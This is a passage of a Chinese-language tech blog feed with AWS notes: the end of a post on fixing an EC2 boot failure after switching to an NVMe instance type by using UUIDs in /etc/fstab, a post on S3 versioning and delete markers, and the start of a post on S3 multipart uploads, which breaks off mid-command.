Reached target Remote File Systems (Pre).</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Remote File Systems.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started RPC bind service.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Tell Plymouth To Write Out Runtime Data.</span><br><span class="line"></span><br><span class="line">         Starting Activation of DM RAID sets...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Emergency Mode.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Activation of DM RAID sets.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Security Auditing Service.</span><br><span class="line"></span><br><span class="line">         Starting Update UTMP about System Boot/Shutdown...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Update UTMP about System Boot/Shutdown.</span><br><span class="line"></span><br><span class="line">         Starting Update UTMP about System Runlevel Changes...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Update UTMP about System Runlevel Changes.</span><br><span class="line"></span><br><span class="line">[   95.540099] cloud-init[1827]: Cloud-init v. 18.5-2.amzn2 running &apos;init&apos; at Fri, 15 Nov 2019 04:17:21 +0000. Up 95.51 seconds.</span><br><span class="line"></span><br><span class="line">[   95.567423] cloud-init[1827]: ci-info: +++++++++++++++++++++++++++Net device info++++++++++++++++++++++++++++</span><br><span class="line"></span><br><span class="line">[   95.567635] cloud-init[1827]: ci-info: +--------+-------+-----------+-----------+-------+-------------------+</span><br><span class="line"></span><br><span class="line">[   95.568072] cloud-init[1827]: ci-info: | Device |   Up  |  Address  |    Mask   | Scope |     Hw-Address    |</span><br><span class="line"></span><br><span class="line">[   95.568462] cloud-init[1827]: ci-info: +--------+-------+-----------+-----------+-------+-------------------+</span><br><span class="line"></span><br><span class="line">[   95.568875] cloud-init[1827]: ci-info: |  eth0  | False |     .     |     .     |   .   | 06:db:1b:e7:ab:1e |</span><br><span class="line"></span><br><span class="line">[   95.569306] cloud-init[1827]: ci-info: |   lo   |  True | 127.0.0.1 | 255.0.0.0 |  host |         .         |</span><br><span class="line"></span><br><span class="line">[   95.569759] cloud-init[1827]: ci-info: |   lo   |  True |  ::1/128  |     .     |  host |         .         |</span><br><span class="line"></span><br><span class="line">[   95.570163] cloud-init[1827]: ci-info: +--------+-------+-----------+-----------+-------+-------------------+</span><br><span class="line"></span><br><span class="line">[   95.570586] cloud-init[1827]: ci-info: +++++++++++++++++++Route IPv6 info+++++++++++++++++++</span><br><span class="line"></span><br><span class="line">[   95.570743] cloud-init[1827]: ci-info: +-------+-------------+---------+-----------+-------+</span><br><span class="line"></span><br><span class="line">[   95.574544] cloud-init[1827]: ci-info: | Route | Destination | Gateway | Interface | Flags |</span><br><span class="line"></span><br><span class="line">[   95.576261] cloud-init[1827]: ci-info: +-------+-------------+---------+-----------+-------+</span><br><span class="line"></span><br><span class="line">[   95.576505] cloud-init[1827]: ci-info: +-------+-------------+---------+-----------+-------+</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Initial cloud-init job (metadata service crawler).</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Cloud-config availability.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Network is Online.</span><br><span class="line"></span><br><span class="line">[  184.998542] systemctl[1856]: Job for acpid.service canceled.</span><br><span class="line"></span><br><span class="line">Welcome to emergency mode! After logging in, type &quot;journalctl -xb&quot; to view</span><br><span class="line">system logs, &quot;systemctl reboot&quot; to reboot, &quot;systemctl default&quot; or ^D to</span><br><span class="line">try again to boot into default mode.</span><br><span class="line"></span><br><span class="line">Cannot open access to console, the root account is locked.</span><br><span class="line">See sulogin(8) man page for more details.</span><br><span class="line"></span><br><span class="line">Press Enter to continue.</span><br></pre></td></tr></table></figure></li></ol><p>划重点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[[1;31m TIME [0m] Timed out waiting for device dev-xvdf.device.</span><br><span class="line"></span><br><span class="line">[[1;33mDEPEND[0m] Dependency failed for /data.</span><br><span class="line"></span><br><span class="line">[[1;33mDEPEND[0m] Dependency failed for Local File Systems.</span><br><span class="line"></span><br><span class="line">[[1;33mDEPEND[0m] Dependency failed for Migrate local... structure to the new structure.</span><br><span class="line"></span><br><span class="line">[[1;33mDEPEND[0m] Dependency failed for File System Check on /dev/xvdf.</span><br></pre></td></tr></table></figure></p><h2 id="0x02-解决办法"><a href="#0x02-解决办法" class="headerlink" title="0x02 解决办法"></a>0x02 解决办法</h2><p>知道问题的原因，也就容易解决了，把实例切回去，然后把设备名改成UUID就完事了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">blkid 查看设备的UUID</span><br><span class="line">vim /etc/fstab 替换UUID</span><br><span class="line">mount -a 完事</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-3-4 ec2-user]# blkid</span><br><span class="line">/dev/xvda1: LABEL=&quot;/&quot; UUID=&quot;0a5c8d10-5fd5-4c87-8778-4afc3ce97dd9&quot; TYPE=&quot;xfs&quot; PARTLABEL=&quot;Linux&quot; PARTUUID=&quot;cccf8d79-364e-4647-879b-1db93bbe3012&quot;</span><br><span class="line">/dev/xvdf: UUID=&quot;510864a5-230b-4a1c-987f-4ed15a061681&quot; TYPE=&quot;xfs&quot;</span><br><span class="line">[root@ip-10-0-3-4 ec2-user]# vim /etc/fstab</span><br><span class="line">[root@ip-10-0-3-4 ec2-user]# mount -a</span><br><span class="line">[root@ip-10-0-3-4 ec2-user]#</span><br></pre></td></tr></table></figure><p>然后再切成nvme的实例类型就没啥事了。</p><h2 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h2><p>心累，太菜了我。</p><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><ul><li><a href="https://aws.amazon.com/premiumsupport/knowledge-center/boot-error-linux-m5-c5/?nc1=h_ls" target="_blank" rel="noopener">Why is my Linux instance not booting after I changed its type to C5 or M5?</a></li><li><a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/nvme-ebs-volumes.html" target="_blank" rel="noopener">Amazon EBS and NVMe on Linux Instances</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;我有一台t2.micro的EC2实例，上头挂了一个EBS卷，完事有一天我给他切成t3.micro的实
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>聊一聊AWS S3的版本控制</title>
    <link href="https://tonghuaroot.com/2019/11/12/AWS-S3-Versioning/"/>
    <id>https://tonghuaroot.com/2019/11/12/AWS-S3-Versioning/</id>
    <published>2019-11-12T22:01:01.000Z</published>
    <updated>2019-11-13T11:32:36.637Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>为了避免文件误删除、误修改，这里有一个版本控制的功能。</p><h2 id="0x01-AWS-S3-版本控制"><a href="#0x01-AWS-S3-版本控制" class="headerlink" title="0x01 AWS S3 版本控制"></a>0x01 AWS S3 版本控制</h2><p>一个比较有意思的点，S3版本控制功能一旦启用之后，是不能禁用的，只能暂停。</p><p>来通过CLI观察一下版本控制的三种状态：</p><ol><li>未开启版本控制</li><li>开启版本控制</li><li>暂停版本控制</li></ol><p><img src="D06AC1AA16134565A529DA0D1094E751" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 ~]$ aws s3api get-bucket-versioning --bucket tonghua-test01</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$ aws s3api get-bucket-versioning --bucket tonghua-test01</span><br><span class="line">&#123;</span><br><span class="line">    &quot;Status&quot;: &quot;Enabled&quot;</span><br><span class="line">&#125;</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$ aws s3api get-bucket-versioning --bucket tonghua-test01</span><br><span class="line">&#123;</span><br><span class="line">    &quot;Status&quot;: &quot;Suspended&quot;</span><br><span class="line">&#125;</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$</span><br></pre></td></tr></table></figure><p>那有一个问题，比如说，我一个S3 Bucket开启了版本控制功能，然后上传文件，同时也产生了多个版本，然后我把它版本控制功能给暂停了，那么之前的object的多个版本仍然会存在，是不会被删掉的，只是再上传上去的文件没有多个版本了而已。</p><p>再有一个，就是我暂停版本控制之后，再往上传对象的时候，会产生一个对象为null的新版本。</p><p><img src="E42AB2E5662A44B684F35E7D242EEDE3" alt="image"></p><p>做个实验看一看：</p><ol><li>暂停版本控制的时候上传1个对象，查看对象的状态</li><li>启用版本控制的时候上传1个对象，在上传一个同名对象给覆盖掉，查看对象状态</li><li>暂停版本控制，上传一个对象，观察对象的状态</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 ~]$ aws s3api get-bucket-versioning --bucket tonghua-test01</span><br><span class="line">&#123;</span><br><span class="line">    &quot;Status&quot;: &quot;Suspended&quot;</span><br><span class="line">&#125;</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$ aws s3 ls s3://tonghua-test01</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$ aws s3 ls s3://tonghua-test01</span><br><span class="line">2019-11-13 04:13:04          5 test01_no_version.txt</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$ aws s3api get-bucket-versioning --bucket tonghua-test01</span><br><span class="line">&#123;</span><br><span class="line">    &quot;Status&quot;: &quot;Enabled&quot;</span><br><span class="line">&#125;</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$ aws s3 ls s3://tonghua-test01</span><br><span class="line">2019-11-13 04:13:04          5 test01_no_version.txt</span><br><span class="line">2019-11-13 04:14:21          5 test02_version.txt</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$ aws s3 ls s3://tonghua-test01</span><br><span class="line">2019-11-13 04:13:04          5 test01_no_version.txt</span><br><span class="line">2019-11-13 04:15:02         12 test02_version.txt</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$ aws s3api delete-object --bucket tonghua-test01 --key test02_version.txt</span><br><span class="line">&#123;</span><br><span class="line">    &quot;VersionId&quot;: &quot;fJt7vWnW8oWhQoHIQ0KitAuIeJZfr2Xb&quot;,</span><br><span class="line">    &quot;DeleteMarker&quot;: true</span><br><span class="line">&#125;</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$</span><br></pre></td></tr></table></figure><p><img src="77D60C75D0DB438F85AF7B0DBDE0456F" alt="image"></p><p>版本ID为null的是我在开启版本控制之前上传的对象。</p><p>这里就有一个比较有意思的问题了，就是我该如何操作才能删除这个version id为null的对象呢？<br>用控制台可以直接删，在CLI中使用–version-id null完事删除失败(错了，试了下，CLI中使用–version-id null也能删，没啥意思。）。</p><p>那我做deletemarker的时候，是再创建一份对象，然后打上deletemarker的标签吗？<br>看起来不是，deletemarker没啥大小。直接就0KB了，不过要是做list object的话，那还是要都遍历一遍，而这些都遍历一遍，那还是挺耗时的。完事虽然这些不会显示出来，但是会频繁响应空的XML，可能会有timeout的风险什么的。解决这个问题的方法也会比较简单粗暴了，用V2版本的api就成<a href="https://docs.aws.amazon.com/cli/latest/reference/s3api/list-objects-v2.html" target="_blank" rel="noopener">list-objects-v2</a></p><p>那我一个对象的多个版本是不是就可以做多个deletemarker了呢？<br>如果我在delete-object时指定一个–version-id，那我是不会做deletemarker的，只会把对应版本的对象给删掉。<br>不过话又说回来，如果我不指定–version-id，只用delete-object的话，那就会有多个deletemarker的标签了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 ~]$ aws s3api delete-object --bucket tonghua-test01 --key test04_no_version.txt</span><br><span class="line">&#123;</span><br><span class="line">    &quot;VersionId&quot;: &quot;vYIFZjYvlioPSExISCzo6aUswP2BsbO1&quot;,</span><br><span class="line">    &quot;DeleteMarker&quot;: true</span><br><span class="line">&#125;</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$ aws s3api delete-object --bucket tonghua-test01 --key test04_no_version.txt</span><br><span class="line">&#123;</span><br><span class="line">    &quot;VersionId&quot;: &quot;e5LeaiviCJMS.lYn8zi4vkmaeBzCY3xC&quot;,</span><br><span class="line">    &quot;DeleteMarker&quot;: true</span><br><span class="line">&#125;</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$</span><br></pre></td></tr></table></figure></p><p><img src="C624DF16818348D5980BD0C0A6C86BE1" alt="image"></p><h2 id="0x02-后记"><a href="#0x02-后记" class="headerlink" title="0x02 后记"></a>0x02 后记</h2><p>没啥说的，就是开版本控制，deletemarker之后，如果没注意，可能会看到桶中的总容量，与我当前版本的容量不一致的情况，这是因为老版本也会占用存储空间。<br>然后分段上传产生的为组装的一起的片段也是占用空间的。</p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><ul><li><a href="https://docs.aws.amazon.com/cli/latest/reference/s3api/list-objects-v2.html" target="_blank" rel="noopener">list-objects-v2</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;为了避免文件误删除、误修改，这里有一个版本控制的功能。&lt;/p&gt;
&lt;h2 id=&quot;0x01-AWS-S
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>AWS S3 Multipart Upload</title>
    <link href="https://tonghuaroot.com/2019/11/08/AWS-S3-Multipart-Upload/"/>
    <id>https://tonghuaroot.com/2019/11/08/AWS-S3-Multipart-Upload/</id>
    <published>2019-11-08T05:36:43.000Z</published>
    <updated>2019-11-08T13:39:51.162Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>记录一下S3分段上传相关的内容，主要涉及到原理以及使用方法，还有一些坑什么的。</p><h2 id="0x01-如何生成大小合适的垃圾文件？"><a href="#0x01-如何生成大小合适的垃圾文件？" class="headerlink" title="0x01 如何生成大小合适的垃圾文件？"></a>0x01 如何生成大小合适的垃圾文件？</h2><p>为了完全覆盖到上传时可能涉及到的边界条件，我们需要构造大小合适的垃圾文件。在这里我们可以使用如下命令生成指定大小的文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/zero of=tonghua.5G bs=1M count=5120</span><br></pre></td></tr></table></figure></p><h2 id="0x02-单文件上传"><a href="#0x02-单文件上传" class="headerlink" title="0x02 单文件上传"></a>0x02 单文件上传</h2><p>单文件上传区别于分段上传，就是我一个文件就是一个文件，也不做任何切割，直接把文件整个上传到S3就完事了。单文件上传本质上调用了<a href="https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutObject.html" target="_blank" rel="noopener">PutObject</a>这个API，他有一些限制，比如说它最多支持上传5G的文件，大于5G的我们就只能使用分段上传了。<br>但是这里也不是说我5G以下就只使用这个也是不对的，根据自己的业务场景，选择合适的分段大小可以极大的提到上传效率，也会避免文件过大中途由于网络等问题导致上传失败什么的。<br>需要留意的是，S3单文件上传最多支持上传5G的文件，大于就不行了。这点可以在官方文档中找到：<a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/UploadingObjects.html" target="_blank" rel="noopener">Uploading Objects</a></p><p>这里我做个演示：</p><ol><li>先生成一个5G大小的垃圾文件：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 test]# dd if=/dev/zero of=tonghua.5G bs=1M count=5120</span><br><span class="line">5120+0 records in</span><br><span class="line">5120+0 records out</span><br><span class="line">5368709120 bytes (5.4 GB) copied, 81.8725 s, 65.6 MB/s</span><br><span class="line">[root@ip-10-0-0-64 test]# file tonghua.5G</span><br><span class="line">tonghua.5G: data</span><br><span class="line">[root@ip-10-0-0-64 test]# ls -alth tonghua.5G</span><br><span class="line">-rw-r--r-- 1 root root 5.0G Nov  5 06:09 tonghua.5G</span><br></pre></td></tr></table></figure></li></ol><p><img src="F55C10721AC04AE4857465234166B6FF" alt="image"></p><ol start="2"><li>然后将其上传至指定的S3 Bucket中<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 test]# aws s3api put-object --bucket aaabbb --key test/tonghua.5G --body tonghua.5G</span><br><span class="line">&#123;</span><br><span class="line">    &quot;ETag&quot;: &quot;\&quot;ec4bcc8776ea04479b786e063a9ace45\&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 test]# md5sum tonghua.5G</span><br><span class="line">ec4bcc8776ea04479b786e063a9ace45  tonghua.5G</span><br><span class="line">[root@ip-10-0-0-64 test]#</span><br></pre></td></tr></table></figure></li></ol><p><img src="10DBDBDC42C14FD59DB7517A5A279D0A" alt="image"></p><p>可以看到目前已经上传成功了。（md5值也是一样的，说明这个文件是完整的）</p><ol start="3"><li>那我如果多加1个字节的内容会发生啥事呢？<br>可以看到直接报错了，文件过大导致上传失败。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 test]# echo 1 &gt;&gt; tonghua.5G</span><br><span class="line">[root@ip-10-0-0-64 test]# ls -alth tonghua.5G</span><br><span class="line">-rw-r--r-- 1 root root 5.1G Nov  5 06:59 tonghua.5G</span><br><span class="line">[root@ip-10-0-0-64 test]# aws s3api put-object --bucket aaabbb --key test/tonghua.5G --body tonghua.5G</span><br><span class="line"></span><br><span class="line">An error occurred (EntityTooLarge) when calling the PutObject operation: Your proposed upload exceeds the maximum allowed size</span><br><span class="line">[root@ip-10-0-0-64 test]#</span><br></pre></td></tr></table></figure></li></ol><p><img src="A0F325E7BC7C4FF88015B57C0558C81F" alt="image"></p><p>好了，这块不是重点，知道单文件最大传5个G就完事了，接下来我们看看分段上传。</p><h2 id="0x03-S3分段上传原理"><a href="#0x03-S3分段上传原理" class="headerlink" title="0x03 S3分段上传原理"></a>0x03 S3分段上传原理</h2><p>分段上传，文档里有提到，最小5M，最大5T。<br>分段上传拢共分为三步：</p><ol><li>初始化</li><li>分段上传</li><li>组装</li></ol><p>这里我拿1G的文件做个测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 test]# dd if=/dev/zero of=tonghua.1G bs=1M count=1024</span><br><span class="line">1024+0 records in</span><br><span class="line">1024+0 records out</span><br><span class="line">1073741824 bytes (1.1 GB) copied, 14.9912 s, 71.6 MB/s</span><br><span class="line">[root@ip-10-0-0-64 test]# file tonghua.1G</span><br><span class="line">tonghua.1G: data</span><br><span class="line">[root@ip-10-0-0-64 test]# ls -alth tonghua.1G</span><br><span class="line">-rw-r--r-- 1 root root 1.0G Nov  5 08:10 tonghua.1G</span><br><span class="line">[root@ip-10-0-0-64 test]# aws s3 cp tonghua.1G s3://aaabbb/test/tonghua.1G</span><br><span class="line">upload: ./tonghua.1G to s3://aaabbb/test/tonghua.1G</span><br><span class="line">[root@ip-10-0-0-64 test]# aws s3api get-object --bucket aaabbb --key test/tonghua.1G 233</span><br><span class="line">&#123;</span><br><span class="line">    &quot;AcceptRanges&quot;: &quot;bytes&quot;,</span><br><span class="line">    &quot;ContentType&quot;: &quot;binary/octet-stream&quot;,</span><br><span class="line">    &quot;LastModified&quot;: &quot;Tue, 05 Nov 2019 08:11:27 GMT&quot;,</span><br><span class="line">    &quot;ContentLength&quot;: 1073741824,</span><br><span class="line">    &quot;ETag&quot;: &quot;\&quot;c789e490a90359de2bd3b09d7e957cfd-128\&quot;&quot;,</span><br><span class="line">    &quot;Metadata&quot;: &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 test]# aws s3api head-object --bucket aaabbb --key test/tonghua.1G</span><br><span class="line">&#123;</span><br><span class="line">    &quot;AcceptRanges&quot;: &quot;bytes&quot;,</span><br><span class="line">    &quot;ContentType&quot;: &quot;binary/octet-stream&quot;,</span><br><span class="line">    &quot;LastModified&quot;: &quot;Tue, 05 Nov 2019 08:11:27 GMT&quot;,</span><br><span class="line">    &quot;ContentLength&quot;: 1073741824,</span><br><span class="line">    &quot;ETag&quot;: &quot;\&quot;c789e490a90359de2bd3b09d7e957cfd-128\&quot;&quot;,</span><br><span class="line">    &quot;Metadata&quot;: &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 test]# md5sum tonghua.1G</span><br><span class="line">cd573cfaace07e7949bc0c46028904ff  tonghua.1G</span><br></pre></td></tr></table></figure></p><p>可以看到文件上传成功，通过ETag的内容我们可知其被分成了128段，然后组装在一起了，也就是8M一段，这也是默认的分段大小。</p><p>我拿了一个16M/9M的两个文件做了个测试，会被分成两段，至此可以得出结论，cli默认文件大于8M之后就会采用分段上传了。（下面的文档上也写了这一点）</p><p>这个也是可以在CLI配置文件中做修改的，具体可以参考这个链接<a href="https://docs.aws.amazon.com/cli/latest/topic/s3-config.html" target="_blank" rel="noopener">AWS CLI S3 Configuration</a>。</p><ul><li>multipart_chunksize 参数控制一个文件片段为多大</li><li>multipart_threshold 参数控制大于多大的文件会采用分段上传操作</li></ul><p>需要提及的是，这个只支持aws s3命令，而不适用与aws s3api命令。</p><h2 id="0x04-实践S3分段上传"><a href="#0x04-实践S3分段上传" class="headerlink" title="0x04 实践S3分段上传"></a>0x04 实践S3分段上传</h2><p>这里我用s3api演示一下手动分段上传。</p><ol><li>先把一个1G的文件拆开(200M一份，拢共6份)：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 test]# split -b 200M tonghua.1G</span><br><span class="line">[root@ip-10-0-0-64 test]# ls -alth</span><br><span class="line">total 14G</span><br><span class="line">-rw-r--r--  1 root root  24M Nov  7 06:20 xaf</span><br><span class="line">drwxr-xr-x  2 root root  182 Nov  7 06:20 .</span><br><span class="line">-rw-r--r--  1 root root 200M Nov  7 06:20 xae</span><br><span class="line">-rw-r--r--  1 root root 200M Nov  7 06:20 xad</span><br><span class="line">-rw-r--r--  1 root root 200M Nov  7 06:20 xac</span><br><span class="line">-rw-r--r--  1 root root 200M Nov  7 06:20 xab</span><br><span class="line">-rw-r--r--  1 root root 200M Nov  7 06:20 xaa</span><br><span class="line">dr-xr-x--- 13 root root 4.0K Nov  7 00:00 ..</span><br><span class="line">-rw-r--r--  1 root root 9.0M Nov  5 08:56 tonghua.9M</span><br><span class="line">-rw-r--r--  1 root root  16M Nov  5 08:34 tonghua.16M</span><br><span class="line">-rw-r--r--  1 root root 1.0G Nov  5 08:28 233</span><br><span class="line">-rw-r--r--  1 root root 1.0G Nov  5 08:10 tonghua.1G</span><br><span class="line">-rw-r--r--  1 root root 5.1G Nov  5 06:59 tonghua.5G</span><br><span class="line">-rw-r--r--  1 root root 5.0G Nov  5 06:04 tmp.5G</span><br><span class="line">-rw-r--r--  1 root root   89 Oct 30 08:39 1.py</span><br><span class="line">[root@ip-10-0-0-64 test]#</span><br></pre></td></tr></table></figure></li></ol><p><img src="2D610E1EB72A44D3B2EBC0A3A4C09603" alt="image"></p><ol start="2"><li>再做个初始化上传的操作：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 test]# aws s3api create-multipart-upload --bucket aaabbb --key tonghua.1G.MTU</span><br><span class="line">&#123;</span><br><span class="line">    &quot;Bucket&quot;: &quot;aaabbb&quot;,</span><br><span class="line">    &quot;UploadId&quot;: &quot;z6NUjopY8OMv0Qd4Uomi9U4L_hs8ceLesZA4hJZzCm2mRwa0FW4U6ndTsnSnJ6gcVWAPYY_xtV6wIwjeb_AYPRqjGvtF6dtv3NOez3boX9.d4cWudryKsnpfieanIl5.&quot;,</span><br><span class="line">    &quot;Key&quot;: &quot;tonghua.1G.MTU&quot;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 test]#</span><br></pre></td></tr></table></figure></li></ol><p><img src="A1A045BE164E4FF1AB7625BE4FBDA97F" alt="image"></p><ol start="3"><li><p>把刚刚切下来的6段分别上传上去：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 test]# aws s3api upload-part --bucket aaabbb --key tonghua.1G.MTU --part-number 1 --body              xaa --upload-id z6NUjopY8OMv0Qd4Uomi9U4L_hs8ceLesZA4hJZzCm2mRwa0FW4U6ndTsnSnJ6gcVWAPYY_xtV6wIwjeb_AYPRqjGv             tF6dtv3NOez3boX9.d4cWudryKsnpfieanIl5.</span><br><span class="line">&#123;</span><br><span class="line">    &quot;ETag&quot;: &quot;\&quot;3566de3a97906edb98d004d6b947ae9b\&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 test]# aws s3api upload-part --bucket aaabbb --key tonghua.1G.MTU --part-number 2 --body              xab --upload-id z6NUjopY8OMv0Qd4Uomi9U4L_hs8ceLesZA4hJZzCm2mRwa0FW4U6ndTsnSnJ6gcVWAPYY_xtV6wIwjeb_AYPRqjGv             tF6dtv3NOez3boX9.d4cWudryKsnpfieanIl5.</span><br><span class="line">&#123;</span><br><span class="line">    &quot;ETag&quot;: &quot;\&quot;3566de3a97906edb98d004d6b947ae9b\&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 test]# aws s3api 